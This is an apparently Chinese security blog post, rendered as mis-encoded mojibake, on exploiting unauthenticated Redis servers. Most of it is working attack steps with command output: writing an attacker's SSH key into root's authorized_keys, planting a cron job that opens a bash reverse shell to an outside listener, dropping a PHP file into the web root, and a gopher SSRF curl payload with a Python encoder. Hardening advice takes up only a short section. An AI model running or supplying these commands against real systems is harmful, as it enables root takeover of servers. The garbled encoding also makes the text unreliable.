I"ÿ_<p>https://github.com/knownsec/pocsuite</p>

<p>Redis é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œè¿™æ ·å°†ä¼šå°† Redis æœåŠ¡æš´éœ²åˆ°å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰å¼€å¯è®¤è¯çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—® Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ã€‚æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—® Redis çš„æƒ…å†µä¸‹å¯ä»¥åˆ©ç”¨ Redis çš„ç›¸å…³æ–¹æ³•ï¼Œå¯ä»¥æˆåŠŸåœ¨ Redis æœåŠ¡å™¨ä¸Šå†™å…¥å…¬é’¥ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚</p>

<p>æ¼æ´æè¿°
éƒ¨åˆ† Redis ç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œå¹¶ä¸”æ²¡æœ‰å¼€å¯è®¤è¯ï¼ˆè¿™æ˜¯ Redis çš„é»˜è®¤é…ç½®ï¼‰ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ï¼Œå°†ä¼šå¯¼è‡´ Redis æœåŠ¡ç›´æ¥æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œå¯¼è‡´å…¶ä»–ç”¨æˆ·å¯ä»¥ç›´æ¥åœ¨éæˆæƒæƒ…å†µä¸‹ç›´æ¥è®¿é—® Redis æœåŠ¡å¹¶è¿›è¡Œç›¸å…³æ“ä½œã€‚</p>

<p>åˆ©ç”¨ Redis è‡ªèº«çš„æä¾›çš„ config å‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„å…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„ /root/.ssh æ–‡ä»¶å¤¹çš„ authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ç›´æ¥ä½¿ç”¨å¯¹åº”çš„ç§é’¥ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚
<!-- more -->
äºŒã€æ¼æ´åˆ©ç”¨
é¦–å…ˆåœ¨æœ¬åœ°ç”Ÿäº§å…¬ç§é’¥æ–‡ä»¶ï¼š
$ ssh-keygen â€“t rsa</p>

<p>ç„¶åå°†å…¬é’¥å†™å…¥ foo.txt æ–‡ä»¶
$ (echo -e â€œ\n\nâ€; cat id_rsa.pub; echo -e â€œ\n\nâ€) &gt; foo.txt</p>

<p>è¿æ¥ Redis å†™å…¥æ–‡ä»¶
$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
$ redis-cli -h 192.168.1.11
$ 192.168.1.11:6379&gt; config set dir /root/.ssh/
OK
$ 192.168.1.11:6379&gt; config get dir
1) â€œdirâ€
2) â€œ/root/.sshâ€
$ 192.168.1.11:6379&gt; config set dbfilename â€œauthorized_keysâ€
OK
$ 192.168.1.11:6379&gt; save
OK</p>

<p>è¿™é‡Œè®²è§£ä¸‹ï¼Œè¿™é‡Œè®¾å®šäº† crackit çš„é”®å€¼ä¸ºå…¬é’¥ï¼Œå¹¶é€šè¿‡ redis å‘½ä»¤å˜æ›´ Redis DB æ–‡ä»¶åŠå­˜æ”¾åœ°ç‚¹ä¸ºé»˜è®¤ root ç”¨æˆ· SSH key å­˜æ”¾æ–‡ä»¶ï¼Œå¹¶å°†é”®å€¼é‡å®šå‘è¿½åŠ åˆ°è¿œç¨‹æ–‡ä»¶ authorized_keys çš„æœ«å°¾ï¼Œä¹Ÿå°±ä¸Šä¼ äº†å…¬é’¥ã€‚</p>

<p>è¿™æ ·å°±å¯ä»¥æˆåŠŸçš„å°†è‡ªå·±çš„å…¬é’¥å†™å…¥ /root/.ssh æ–‡ä»¶å¤¹çš„ authotrized_keys æ–‡ä»¶é‡Œï¼Œç„¶åæ”»å‡»è€…ç›´æ¥æ‰§è¡Œï¼š
$ ssh â€“i  id_rsa root@192.168.1.11</p>

<p>å¯è¿œç¨‹åˆ©ç”¨è‡ªå·±çš„ç§é’¥ç™»å½•è¯¥æœåŠ¡å™¨ã€‚</p>

<p>åˆšåˆšæˆ‘ä»¬æåˆ°å…¬é’¥ç™»å½•å’Œ Redis æŒä¹…åŒ–å­˜æ”¾æ•°æ®æ“ä½œï¼Œè¿™é‡Œç®€å•è®²ä¸‹åŸç†</p>

<p>è¯¦ç»†è®²è§£ ssh ç™»å½•â€“å…¬é’¥ç™»å½•
SSH æä¾›äº†å…¬é’¥ç™»å½•ï¼Œå¯ä»¥çœå»è¾“å…¥å¯†ç çš„æ­¥éª¤ã€‚</p>

<p>æ‰€è°“â€ å…¬é’¥ç™»å½•â€ï¼ŒåŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯ç”¨æˆ·å°†è‡ªå·±çš„å…¬é’¥å‚¨å­˜åœ¨è¿œç¨‹ä¸»æœºä¸Šã€‚ç™»å½•çš„æ—¶å€™ï¼Œè¿œç¨‹ä¸»æœºä¼šå‘ç”¨æˆ·å‘é€ä¸€æ®µéšæœºå­—ç¬¦ä¸²ï¼Œç”¨æˆ·ç”¨è‡ªå·±çš„ç§é’¥åŠ å¯†åï¼Œå†å‘å›æ¥ã€‚è¿œç¨‹ä¸»æœºç”¨äº‹å…ˆå‚¨å­˜çš„å…¬é’¥è¿›è¡Œè§£å¯†ï¼Œå¦‚æœæˆåŠŸï¼Œå°±è¯æ˜ç”¨æˆ·æ˜¯å¯ä¿¡çš„ï¼Œç›´æ¥å…è®¸ç™»å½• shellï¼Œä¸å†è¦æ±‚å¯†ç ã€‚</p>

<p>è¿™ç§æ–¹æ³•è¦æ±‚ç”¨æˆ·å¿…é¡»æä¾›è‡ªå·±çš„å…¬é’¥ã€‚å¦‚æœæ²¡æœ‰ç°æˆçš„ï¼Œå¯ä»¥ç›´æ¥ç”¨ ssh-keygen ç”Ÿæˆä¸€ä¸ªï¼š
$ ssh-keygen</p>

<p>è¿è¡Œä¸Šé¢çš„å‘½ä»¤ä»¥åï¼Œç³»ç»Ÿä¼šå‡ºç°ä¸€ç³»åˆ—æç¤ºï¼Œå¯ä»¥ä¸€è·¯å›è½¦ã€‚å…¶ä¸­æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œè¦ä¸è¦å¯¹ç§é’¥è®¾ç½®å£ä»¤ï¼ˆpassphraseï¼‰ï¼Œå¦‚æœæ‹…å¿ƒç§é’¥çš„å®‰å…¨ï¼Œè¿™é‡Œå¯ä»¥è®¾ç½®ä¸€ä¸ªã€‚</p>

<p>è¿è¡Œç»“æŸä»¥åï¼Œåœ¨ $HOME/.ssh/ç›®å½•ä¸‹ï¼Œä¼šæ–°ç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ï¼šid_rsa.pub å’Œ id_rsaã€‚å‰è€…æ˜¯ä½ çš„å…¬é’¥ï¼Œåè€…æ˜¯ä½ çš„ç§é’¥ã€‚</p>

<p>é€šå¸¸è¿™æ—¶å†è¾“å…¥ä¸‹é¢çš„å‘½ä»¤ï¼Œå°†å…¬é’¥ä¼ é€åˆ°è¿œç¨‹ä¸»æœº host ä¸Šé¢ï¼š
$ ssh-copy-id user@host</p>

<p>authorized_keys æ–‡ä»¶ï¼Œè¿œç¨‹ä¸»æœºå°†ç”¨æˆ·çš„å…¬é’¥ï¼Œä¿å­˜åœ¨ç™»å½•åçš„ç”¨æˆ·ä¸»ç›®å½•çš„ $HOME/.ssh/authorized_keys æ–‡ä»¶ä¸­ã€‚å…¬é’¥å°±æ˜¯ä¸€æ®µå­—ç¬¦ä¸²ï¼Œåªè¦æŠŠå®ƒè¿½åŠ åœ¨ authorized_keys æ–‡ä»¶çš„æœ«å°¾å°±è¡Œäº†ã€‚</p>

<p>è¯¦ç»†ç›¸å…³çš„ Redis æŒä¹…åŒ–å‘½ä»¤
Redis æ”¯æŒ 2 ç§æŒä¹…åŒ–ç­–ç•¥ï¼šsnapshot æ–¹å¼å’Œ commandlog æ–¹å¼ï¼Œå‰è€…é€šè¿‡å°†å½“å‰å†…å­˜æ•°æ®å¿«ç…§å‘¨æœŸæ€§å†™å…¥ RDB æ–‡ä»¶æ¥å®ç°ï¼›åè€…é€šè¿‡åœ¨ log ä¸­è®°å½• Redis è¿›ç¨‹æ”¶åˆ°çš„å†™æ“ä½œæ¥å®ç°ï¼Œä¸‹æ¬¡ Redis é‡å¯æ—¶ï¼Œå›æ”¾ commandlog æ¥æ¢å¤æ•°æ®çŠ¶æ€ã€‚
è¿™é‡Œä½¿ç”¨ RDB æ–‡ä»¶å†™å…¥ SSH key æ–‡ä»¶ï¼Œéœ€è¦è®¾ç½®ä»¥ä¸‹ä¸¤ä¸ª RDB ç›¸å…³é…ç½®</p>

<p>dbfilename</p>

<p>æŒ‡å®š RDB æ–‡ä»¶åï¼Œé»˜è®¤ä¸º dump.rdb</p>

<p>dir</p>

<p>æŒ‡å®š RDB æ–‡ä»¶å­˜æ”¾ç›®å½•çš„è·¯å¾„ï¼Œè‹¥åŒ…å«å¤šçº§è·¯å¾„ï¼Œåˆ™ç›¸å…³çˆ¶è·¯å¾„éœ€äº‹å…ˆ mkdir å‡ºæ¥ï¼Œå¦åˆ™å¯åŠ¨å¤±è´¥ã€‚</p>

<p>set(key, value)ï¼šç»™æ•°æ®åº“ä¸­åç§°ä¸º key çš„ string èµ‹äºˆå€¼ value</p>

<p>æœ€å Client ä½¿ç”¨ save å‘½ä»¤é€šçŸ¥ redis åšä¸€æ¬¡å¿«ç…§æŒä¹…åŒ–</p>

<p>ä¿®å¤å»ºè®®/å®‰å…¨å»ºè®®</p>
<ol>
  <li>ç¦æ­¢ä¸€äº›é«˜å±å‘½ä»¤
ä¿®æ”¹ redis.conf æ–‡ä»¶ï¼Œæ·»åŠ 
rename-command FLUSHALL â€œâ€
rename-command CONFIG   â€œâ€
rename-command EVAL     â€œâ€</li>
</ol>

<p>æ¥ç¦ç”¨è¿œç¨‹ä¿®æ”¹ DB æ–‡ä»¶åœ°å€</p>

<ol>
  <li>
    <p>ä»¥ä½æƒé™è¿è¡Œ Redis æœåŠ¡
ä¸º Redis æœåŠ¡åˆ›å»ºå•ç‹¬çš„ç”¨æˆ·å’Œå®¶ç›®å½•ï¼Œå¹¶ä¸”é…ç½®ç¦æ­¢ç™»é™†
$ groupadd -r redis &amp;&amp; useradd -r -g redis redis</p>
  </li>
  <li>
    <p>ä¸º Redis æ·»åŠ å¯†ç éªŒè¯
ä¿®æ”¹ redis.conf æ–‡ä»¶ï¼Œæ·»åŠ </p>
  </li>
</ol>

<p>requirepass mypassword</p>

<ol>
  <li>
    <p>ç¦æ­¢å¤–ç½‘è®¿é—® Redis
ä¿®æ”¹ redis.conf æ–‡ä»¶ï¼Œæ·»åŠ æˆ–ä¿®æ”¹ï¼Œä½¿å¾— Redis æœåŠ¡åªåœ¨å½“å‰ä¸»æœºå¯ç”¨
bind 127.0.0.1</p>
  </li>
  <li>
    <p>ä¿è¯ authorized_keys æ–‡ä»¶çš„å®‰å…¨
ä¸ºäº†ä¿è¯å®‰å…¨ï¼Œæ‚¨åº”è¯¥é˜»æ­¢å…¶ä»–ç”¨æˆ·æ·»åŠ æ–°çš„å…¬é’¥ã€‚</p>
  </li>
</ol>

<p>å°† authorized_keys çš„æƒé™è®¾ç½®ä¸ºå¯¹æ‹¥æœ‰è€…åªè¯»ï¼Œå…¶ä»–ç”¨æˆ·æ²¡æœ‰ä»»ä½•æƒé™ï¼š
$ chmod 400 ~/.ssh/authorized_keys</p>

<p>ä¸ºä¿è¯ authorized_keys çš„æƒé™ä¸ä¼šè¢«æ”¹æ‰ï¼Œæ‚¨è¿˜éœ€è¦è®¾ç½®è¯¥æ–‡ä»¶çš„ immutable ä½æƒé™ï¼š</p>
<h1 id="chattr-i-sshauthorized_keys">chattr +i ~/.ssh/authorized_keys</h1>

<p>ç„¶è€Œï¼Œç”¨æˆ·è¿˜å¯ä»¥é‡å‘½å ~/.sshï¼Œç„¶åæ–°å»ºæ–°çš„ ~/.ssh ç›®å½•å’Œ authorized_keys æ–‡ä»¶ã€‚è¦é¿å…è¿™ç§æƒ…å†µï¼Œéœ€è¦è®¾ç½® ~./ssh çš„ immutable ä½æƒé™ï¼š</p>
<h1 id="chattr-i-ssh">chattr +i ~/.ssh</h1>

<p>æ³¨æ„: å¦‚æœéœ€è¦æ·»åŠ æ–°çš„å…¬é’¥ï¼Œéœ€è¦ç§»é™¤ authorized_keys çš„ immutable ä½æƒé™ã€‚ç„¶åï¼Œæ·»åŠ å¥½æ–°çš„å…¬é’¥ä¹‹åï¼ŒæŒ‰ç…§ä¸Šè¿°æ­¥éª¤é‡æ–°åŠ ä¸Š immutable ä½æƒé™ã€‚</p>

<p>0x00 å±å®³
ä¿¡æ¯æ³„éœ²</p>

<p>ç³»ç»Ÿä¿¡æ¯
redisä¿å­˜çš„ä¿¡æ¯
GetShell</p>

<p>åœ¨Webç›®å½•ä¸­å†™å…¥webshell
å†™å…¥SSHå…¬é’¥ç›´æ¥è¿æ¥
å†™å…¥è®¡åˆ’ä»»åŠ¡(corntab)åå¼¹shell</p>

<p>0x02 ä¿¡æ¯æ³„éœ²
æ•°æ®æ³„éœ²
è·å–æ‰€æœ‰çš„keyå€¼ keys *</p>

<p>ç³»ç»Ÿä¿¡æ¯æ³„éœ²
info å‘½ä»¤</p>

<p>å¯ä»¥çœ‹åˆ°redisçš„ç‰ˆæœ¬ã€ç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬ã€é…ç½®æ–‡ä»¶è·¯å¾„ç­‰ä¿¡æ¯</p>

<p>0x03 GetShell
åœ¨Webç›®å½•ä¸­å†™å…¥webshell
å‰ææ¡ä»¶</p>

<p>å·²çŸ¥ç½‘ç«™ç›®å½•çš„ç»å¯¹è·¯å¾„ï¼Œå¹¶ä¸”å…·æœ‰è¯»å†™æƒé™
å†™å…¥SSHå…¬é’¥ç›´æ¥è¿æ¥
æœ¬åœ°ç”Ÿæˆå…¬é’¥å’Œç§é’¥
å°†å…¬é’¥å†™å…¥åˆ°ç›®æ ‡çš„.sshæ–‡ä»¶å¤¹
ssh è¿æ¥</p>

<p>å†™å…¥ssh-keygenå…¬é’¥
ç°åœ¨ä¸‹å…ˆåœ¨æœ¬åœ°ç”Ÿæˆä¸€å¯¹å¯†é’¥
kingkk@ubuntu:~/.ssh$ ssh-keygen -t rsa
è¿™æ ·å°±å¯ä»¥åœ¨~/.sshç›®å½•ä¸‹ç”Ÿæˆä¸€å¯¹id_rsaã€id_rsa.pub</p>

<p>ç„¶åè¿æ¥é¶æœºredis
kingkk@ubuntu:~/test/redis$ redis-cli -h 192.168.85.132           # è¿æ¥é¶æœº
192.168.85.132:6379&gt; config set dir /root/.ssh                    # è®¾ç½®æœ¬åœ°å­˜å‚¨æ–‡ä»¶ç›®å½•
OK
192.168.85.132:6379&gt; config set dbfilename authorized_keys        # è®¾ç½®æœ¬åœ°å­˜å‚¨æ–‡ä»¶å
OK
192.168.85.132:6379&gt; set x â€œ\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCjFdA5iENqT7mVAv3kopJZi0jtaDbXq2VwX7AM4Gk8wkAgBjnNGuxP0Tt5Sz0sQY1brgP7pmtTCeXUhPS33qK9RWXHNNuAAnns3c5nTtEuKvZtE+5aFDiVvyjDBhvR9YfzQFc+MgCDNedF6Fe+tzSPxDvqk5hGUoqEgwQS0NQNEIN93qN/qEiCXrUMacy6JS6fa2AC99JO+0LdVB0yMPgW2neJZSoJOYdFdJiW4XSn94aUf/mHmZQbT2VxNHv1nEspyhssTaNzDrBAE60hL91Q+CEO2ir2sSZ95xwJXJQJbeD1HyyiAhwg/ajoBafT45Ae5BjY+cH9a8gCpzXu8Tp7 kingkk@ubuntu\n\n\nâ€                                  		                           # è®¾ç½®ä¸€ä¸ªå€¼ä¸ºid_rsa.pubå…¬é’¥å€¼
OK
192.168.85.132:6379&gt; save                                         # å­˜å‚¨æ•°æ®
OK
è¿™æ ·ï¼Œæˆ‘ä»¬å°±æŠŠå…¬é’¥å†™å…¥å¯¹æ–¹çš„æœåŠ¡å™¨äº†ï¼Œç›´æ¥ç”¨ç”Ÿæˆçš„ç§é’¥è¿æ¥å³å¯
kingkk@ubuntu:~/.ssh$ ssh -i id_rsa root@192.168.85.132
Last login: Sun Mar 11 03:50:15 2018 from 172.22.224.117
[root@localhost ~]# id
uid=0(root) gid=0(root) ç»„=0(root) ç¯å¢ƒ=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
You have new mail in /var/spool/mail/root</p>

<p>å‡å¦‚æŠ¥äº†å¦‚ä¸‹é”™è¯¯
sign_and_send_pubkey: signing failed: agent refused operation
è¿è¡Œä¸‹å¦‚ä¸‹ä¸¤å¥å³å¯
eval â€œ$(ssh-agent -s)â€
ssh-add
åˆ©ç”¨è®¡åˆ’ä»»åŠ¡åå¼¹shell
å…ˆå¼€ä¸€ä¸ªç»ˆç«¯ç›‘å¬æœ¬åœ°çš„23333ç«¯å£
nc -nlvp 23333
åˆ©ç”¨ä¹‹å‰ç±»ä¼¼çš„æ–‡ä»¶å†™å…¥ï¼Œå†™å…¥å®šæ—¶å‘½ä»¤
192.168.85.132:6379&gt; set x â€œ\n* * * * * /bin/bash -i &gt; /dev/tcp/192.168.85.128/23333 0&lt;&amp;1 2&gt;&amp;1\nâ€
OK
192.168.85.132:6379&gt; config set dir /var/spool/cron/
OK
192.168.85.132:6379&gt; config set dbfilename root
OK
192.168.85.132:6379&gt; save
OK
éœ€è¦ç­‰å¾…ä¸€ä¼šï¼Œä¸€èˆ¬ä¸€åˆ†é’Ÿä¹‹å†…å§ï¼Œncå°±èƒ½æ”¶åˆ°åå¼¹å›æ¥çš„shelläº†</p>

<p>å†™å…¥webshell
å½“redisæƒé™è¾ƒä½ï¼Œä¸Šé¢ä¸¤ç§æ–¹æ³•éƒ½è¡Œä¸é€šçš„æ—¶å€™ï¼Œå¯ä»¥å°è¯•å¾€webæœåŠ¡ä¸­å†™å…¥ä¸€å¥è¯ï¼Œè·å–webshell
192.168.85.132:6379&gt; set x â€œ&lt;?php phpinfo();?&gt;â€
OK
192.168.85.132:6379&gt; config set dir /var/www/html
OK
192.168.85.132:6379&gt; config set dbfilename shell.php
OK
192.168.85.132:6379&gt; save
OK
è¿™æ ·ï¼Œå°±èƒ½åœ¨æ ¹ç›®å½•ä¸‹ç”Ÿæˆshell.phpã€‚è®¿é—®ä¸€ä¸‹</p>

<p>ç»“åˆSSRF
ä¹‹å‰èƒ½çœ‹åˆ°ï¼Œé»˜è®¤æƒ…å†µä¸‹è™½ç„¶æ˜¯æ²¡æœ‰å¯†ç ï¼Œä½†æ˜¯ä¼šå¼€å¯protectedä¿æŠ¤æ¨¡å¼</p>

<p>åœ¨è¿™æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°è¯•è¿æ¥ä¸€ä¸‹å¯¹æ–¹redis
kingkk@ubuntu:~/test/redis$ redis-cli -h 192.168.85.132
192.168.85.132:6379&gt; info
DENIED Redis is running in protected mode because protected mode is enabled, no bind address was specified, no authentication password is requested to clients. In this mode connections are only accepted from the loopback interface. If you want to connect from external computers to Redis you may adopt one of the following solutions: 1) Just disable protected mode sending the command â€˜CONFIG SET protected-mode noâ€™ from the loopback interface by connecting to Redis from the same host the server is running, however MAKE SURE Redis is not publicly accessible from internet if you do so. Use CONFIG REWRITE to make this change permanent. 2) Alternatively you can just disable the protected mode by editing the Redis configuration file, and setting the protected mode option to â€˜noâ€™, and then restarting the server. 3) If you started the server manually just for testing, restart it with the â€˜â€“protected-mode noâ€™ option. 4) Setup a bind address or an authentication password. NOTE: You only need to do one of the above things in order for the server to start accepting connections from the outside.</p>

<p>å¯ä»¥çœ‹åˆ°ä¿æŠ¤æ¨¡å¼æ‹’ç»äº†redisçš„è¿œç¨‹è¿æ¥ï¼Œæ‰€ä»¥ç»å¸¸rediséƒ½æ˜¯é…åˆç€ssrfè¿™ä¸ªå¯ä»¥ä¼ªé€ èº«ä»½çš„æ”»å‡»æ–¹å¼ä¸€èµ·è¿›è¡Œæ”»å‡»</p>

<p>gopheråè®®
Gopher åè®®æ˜¯ HTTP åè®®å‡ºç°ä¹‹å‰ï¼Œåœ¨ Internet ä¸Šå¸¸è§ä¸”å¸¸ç”¨çš„ä¸€ä¸ªåè®®ã€‚å½“ç„¶ç°åœ¨ Gopher åè®®å·²ç»æ…¢æ…¢æ·¡å‡ºå†å²ã€‚ Gopher åè®®å¯ä»¥åšå¾ˆå¤šäº‹æƒ…ï¼Œç‰¹åˆ«æ˜¯åœ¨ SSRF ä¸­å¯ä»¥å‘æŒ¥å¾ˆå¤šé‡è¦çš„ä½œç”¨ã€‚åˆ©ç”¨æ­¤åè®®å¯ä»¥æ”»å‡»å†…ç½‘çš„ FTPã€Telnetã€Redisã€Memcacheï¼Œä¹Ÿå¯ä»¥è¿›è¡Œ GETã€POST è¯·æ±‚ã€‚è¿™æ— ç–‘æå¤§æ‹“å®½äº† SSRF çš„æ”»å‡»é¢ã€‚</p>

<p>å¯ä»¥åˆ©ç”¨gopheråè®®ä¼ è¾“redisçš„æ•°æ®æŠ¥æ–‡ï¼Œè¾¾åˆ°ç±»ä¼¼ä¹‹å‰å¯¹redisçš„è¿æ¥ã€è®¾ç½®ã€å­˜å‚¨æ“ä½œ</p>

<p>æŠ“å–æ•°æ®æŠ¥æ–‡
åœ¨é¶æœºä¸­åˆ©ç”¨socatæŠ“å–å‘å¾€redisçš„æ•°æ®æŠ¥æ–‡</p>

<p>socat -v tcp-listen:4444,fork tcp-connect:localhost:6379
åœ¨æ”»å‡»æœºä¸­è¿æ¥é¶æœºçš„4444ç«¯å£ï¼Œé‡æ–°å‘é€æ”»å‡»payload</p>

<p>è¿™é‡Œå…ˆå°†è¦æ‰§è¡Œçš„å‘½ä»¤å†™å…¥äº†shell.shä¸­ï¼Œæ–¹ä¾¿ä¸€æ¬¡æ€§æ‰§è¡Œå®Œæ¯•
echo -e â€œ\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n\nâ€|redis-cli -h $1 -p $2 -x set 1
redis-cli -h $1 -p $2 config set dir /var/spool/cron/
redis-cli -h $1 -p $2 config set dbfilename root
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit
ç„¶ååœ¨æŠŠé¶æœºä¸­æ‰§è¡Œ</p>

<p>./shell.sh 192.168.85.132 4444
è¿”å›äº”ä¸ªOKå°±è¡¨ç¤ºæ‰§è¡ŒæˆåŠŸäº†</p>

<p>åˆ©ç”¨gopherè¿›è¡Œæ”»å‡»
ç„¶åå°†æ•°æ®è½¬æ¢æˆgopheråè®®çš„æ ¼å¼
#coding: utf-8
import sys</p>

<p>exp = â€˜â€™</p>

<p>with open(sys.argv[1]) as f:
    for line in f.readlines():
        if line[0] in â€˜&gt;&lt;+â€™:
            continue
        elif line[-3:-1] == râ€™\râ€™:
            if len(line) == 3:
                exp = exp + â€˜%0a%0d%0aâ€™
            else:
                line = line.replace(râ€™\râ€™, â€˜%0d%0aâ€™)
                line = line.replace(â€˜\nâ€™, â€˜â€™)
                exp = exp + line
        elif line == â€˜\x0aâ€™:
            exp = exp + â€˜%0aâ€™
        else:
            line = line.replace(â€˜\nâ€™, â€˜â€™)
            exp = exp + line
print exp</p>

<p>ç„¶ååœ¨æœ¬åœ°å…ˆç›‘å¬23333ç«¯å£</p>

<p>å†åˆ©ç”¨curlå‘é€payload
curl -v â€˜gopher://192.168.85.132:6379/_<em>3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$67%0d%0a-e %0a%0a</em>/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.85.128/23333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a<em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a</em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a<em>1%0d%0a$4%0d%0asave%0d%0a</em>1%0d%0a$4%0d%0aquit%0d%0aâ€™
ç­‰å¾…ä¸€ä¼šï¼Œå°±èƒ½çœ‹åˆ°ncæ¥åˆ°äº†åå¼¹å›æ¥çš„shell</p>

<p>åœ¨phpä¸­çš„ssrfçš„è¯éœ€è¦å®‰è£…gopheråè®®æ‹“å±•ï¼Œå°±å¯ä»¥è¾¾åˆ°ä¸€æ ·çš„æ•ˆæœã€‚</p>

<p>è‡ªåŠ¨åŒ–åˆ©ç”¨
æˆ‘å°†ä¹‹å‰çš„ä¸‰ç§åˆ©ç”¨æ–¹å¼éƒ½å†™æˆäº†.shçš„è„šæœ¬å½¢å¼ï¼Œæ–¹ä¾¿ä½¿ç”¨,åªéœ€æœ¬åœ°è¦æå‰å®‰è£…å¥½redis</p>

<p>https://github.com/kingkaki/Exploit-scripts/tree/master/redis è¿˜åŒ…å«äº†socatæ•è·çš„æµé‡æŠ¥æ–‡æ ·ä¾‹</p>

<p>https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/</p>

<p>è§£å†³rediså†™å…¬é’¥ä¾ç„¶æ— æ³•ç™»å½•çš„æƒ…å†µ
æœ‰äº›æœ‹å‹åœ¨åˆ©ç”¨Rediså†™å…¬é’¥ä¾ç„¶æ— æ³•ç©ºå¯†ç ç™»å½•ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ
è§£å†³æ–¹æ³•</p>

<p>Aã€å°†è‡ªå·±çš„å…¬é’¥é€šè¿‡ä»¥ä¸Šæ–¹æ³•ç”Ÿæˆauthrized_keysï¼Œç„¶åé€šè¿‡æœ¬åœ°å½¢å¼(æœ¬æœºæµ‹è¯•æœ¬æœºæ–¹å¼)ï¼Œssh localhost æ–¹å¼å°è¯•ç™»å½•ï¼Œå¦‚æœèƒ½æ­£å¸¸ç™»å½•ï¼Œåˆ™è¡¨ç¤ºæˆæƒçš„KEYæ²¡æœ‰ä»»ä½•é—®é¢˜</p>

<p>Bã€è¢«æ¸—é€çš„æœåŠ¡å™¨ä¸Šæˆæƒkeyçš„æƒé™é—®é¢˜åº”è¯¥ä¸º600
åˆ©ç”¨Linuxä»»åŠ¡è®¡åˆ’æ¥è®¾ç½®æˆæƒçš„authorized_keysæƒé™ä¸º600ã€‚
echo -e â€œ\n\n*/1 * * * * /bin/chmod 600 ~/.ssh/authorized_keys\n\nâ€|redis-cli -h 127.0.0.1 -x set 1
redis-cli -h 127.0.0.1 config set dir /var/spool/cron/
redis-cli -h 127.0.0.1 config set dbfilename root
redis-cli -h 127.0.0.1 save</p>

<p>é‡Šä¹‰ï¼šä¸Šé¢è¿™æ®µå…¶å®ä¹Ÿæ˜¯ä¿å­˜redisæ•°æ®çš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œä¸è¿‡è¿™ä¸ªè¿‡ç¨‹æ˜¯å°†æ•°æ®ä¿å­˜ä¸ºadminï¼Œå­˜æ”¾åœ¨/var /spool/cronä¸‹ï¼Œè¿™ä¸ªæ˜¯ä¸“é—¨å­˜æ”¾ä»»åŠ¡è®¡åˆ’çš„ï¼Œè€ŒKey 1çš„å€¼çš„å«ä¹‰åˆ™æ˜¯ï¼šè®¾ç½®ä»»åŠ¡è®¡åˆ’ä¸€åˆ†é’Ÿåæ‰§è¡Œchmod 600ä¿®æ”¹authorized_keysçš„æƒé™ä¸º600</p>

<p>Cã€æœåŠ¡å™¨æ²¡æœ‰.sshç›®å½•çš„é—®é¢˜</p>

<p>åˆ©ç”¨Linuxä»»åŠ¡è®¡åˆ’æ¥åˆ›å»ºè¯¥æ–‡ä»¶å¤¹
echo -e â€œ\n\n*/1 * * * * /bin/make ~/.ssh \n\nâ€|redis-cli -h 127.0.0.1 -x set 2
redis-cli -h 127.0.0.1 config set dir /var/spool/cron/
redis-cli -h 127.0.0.1 config set dbfilename root
redis-cli -h 127.0.0.1 save</p>

<p>Dã€.sshç›®å½•æƒé™é—®é¢˜</p>

<p>åˆ©ç”¨Linuxä»»åŠ¡è®¡åˆ’æ¥è®¾ç½®.sshç›®å½•çš„æƒé™é—®é¢˜
echo -e â€œ\n\n*/1 * * * * /bin/chmod 700 /home/root/.ssh/\n\nâ€|redis-cli -h 127.0.0.1 -x set 1
redis-cli -h 127.0.0.1 config set dir /var/spool/cron/
redis-cli -h 127.0.0.1 config set dbfilename root
redis-cli -h 127.0.0.1 save</p>

<p>ä¸€ã€æ¼æ´æ¦‚è¿°
